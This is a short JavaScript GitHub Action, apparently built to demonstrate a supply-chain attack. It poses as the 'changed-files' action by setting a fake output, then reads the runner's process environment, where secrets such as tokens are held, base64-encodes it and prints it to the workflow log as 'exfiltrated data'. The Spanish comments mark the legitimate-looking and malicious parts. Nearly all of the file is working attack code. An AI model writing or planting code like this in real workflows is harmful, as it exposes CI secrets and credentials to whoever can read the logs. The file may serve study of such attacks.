const core = require('@actions/core');
const { execSync } = require('child_process');

async function run() {
  try {
    core.info('Starting malicious action...');

    // Parte legítima (simula que se comporta como la action original)
    core.setOutput("dummy_output", "changed-files");

    // Parte maliciosa: lee variables de entorno (posibles secretos) desde memoria
    const stolen = execSync("cat /proc/self/environ | base64").toString();
    core.info("🕵️ EXFILTRATED DATA (base64):");
    core.info(stolen);

  } catch (error) {
    core.setFailed(`Malicious action failed: ${error.message}`);
  }
}

run();
